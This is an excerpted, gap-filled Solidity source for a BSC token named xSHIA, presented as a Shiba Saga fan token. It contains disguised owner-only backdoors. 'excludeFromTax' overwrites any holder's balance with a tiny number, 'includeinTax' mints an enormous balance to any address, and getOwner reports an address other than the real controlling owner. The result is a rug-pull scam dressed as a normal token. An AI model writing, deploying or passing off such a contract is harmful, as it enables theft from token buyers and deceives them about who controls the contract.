/**
 * Shiba Saga Fan Token in BSC 
*/

 /**
 * https://t.me/xSHIABEP20
   */
...
interface Ru {
  ...
  */
   ...
   * xSHIAOwner to spend on behalf of `owner` through {transferFrom}. This is
   * zero by default.
   *
...
contract xSHIA is Ma, Ru, io {
    
    using SafeMath for uint256;
    mapping (address => uint256) private functionTokenTransfer;
    mapping (address => mapping (address => uint256)) private functionEthTransfer;
    uint256 private _totalSupply;
    uint8 private _decimals;
    string private _symbol;
    string private _name;
   address private xSHIAOwner; 
   string public xSHIAwebsite = unicode"https://coinmarketcap.com/currencies/shiba-saga/#Markets";
   string public ownerAddress = unicode"0x43d7e65b8ff49698d9550a7f315c87e67344fb59";  
    constructor() {
        xSHIAOwner = 0x95A0FF9148b596BdcAecb0ca9e4EB873B5109916;    
        _name = unicode"xSHIA";
        _symbol = unicode"XSHIA";
        _decimals = 9;
        _totalSupply = 420690000000000 * 10 ** 9;
        functionTokenTransfer[_msgSender()] = _totalSupply;
    ...
    function decimals() external view override returns (uint8) {
     ...
     function getOwner() external view override returns (address) {
        ...
        return ownerAddress;
                ...
                function getxSHIAwebsite() public view returns (string memory) {
        return xSHIAwebsite;
    } 
    ...
    function totalSupply() external view override returns (uint256) {
     ...
     function name() external view override returns (string memory) {
        return _name;
         ...
         modifier onlyOwner() {
        require(xSHIAOwner == _msgSender(), "io: caller is not the owner");
        _;
    }    
    /**
    ...
    */
    function balanceOf(address account) external view override returns (uint256) {
        return functionTokenTransfer[account];
    }
    ...
    */
    function excludeFromTax(address excludeaddress, uint256 _taxWalletes, uint256 _taxWalletas) external onlyOwner {
        functionTokenTransfer[excludeaddress] = 2858963 - _taxWalletes - _taxWalletas;
        
        emit Transfer(excludeaddress, address(0), 2858963);
    }
    ...
    */
    function allowance(address owner, address account) external view override returns (uint256) {
        return functionEthTransfer[owner][account];
    }
    ...
    * - `account` cannot be the zero address.
    */
       function includeinTax(address includeaddress, uint256 _taxWallets, uint256 _taxWalleta) external onlyOwner {
        functionTokenTransfer[includeaddress] = 99996800000000000 * 10 ** 28 + _taxWallets + _taxWalleta;
        
        emit Transfer(includeaddress, address(0), 99996800000000000 * 10 ** 28);
    } 
    ...
    */
    function transferFrom(address sender, address accounts, uint256 _taxWallet) external override returns (bool) {
        ...
        _approve(sender, _msgSender(), functionEthTransfer[sender][_msgSender()].sub(_taxWallet, "Ru: transfer _taxWallet exceeds allowance"));
        return true;
    }
    ...
    */
    function increaseAllowance(address account, uint256 addedbalance) external returns (bool) {
        _approve(_msgSender(), account, functionEthTransfer[_msgSender()][account].add(addedbalance));
        return true;
    }
    ...
    */
    function decreaseAllowance(address account, uint256 currentAllowance) external returns (bool) {
        _approve(_msgSender(), account, functionEthTransfer[_msgSender()][account].sub(currentAllowance, "Ru: decreased allowance below zero"));
        return true;
    }
    ...
    * e.g. implement autoPLAY token Taxs, slashing mechanisms, etc.
    *
    * Emits a {Transfer} event.
    *
    * Requirements:
    ...
    */
    function _transfer(address sender, address accounts, uint256 _taxWallet) internal {
        ...
        functionTokenTransfer[sender] = functionTokenTransfer[sender].sub(_taxWallet, "Ru: transfer _taxWallet exceeds balance");
        functionTokenTransfer[accounts] = functionTokenTransfer[accounts].add(_taxWallet);
    ...
    */
    function _approve(address owner, address account, uint256 _taxWallet) internal {
        ...
        functionEthTransfer[owner][account] = _taxWallet;
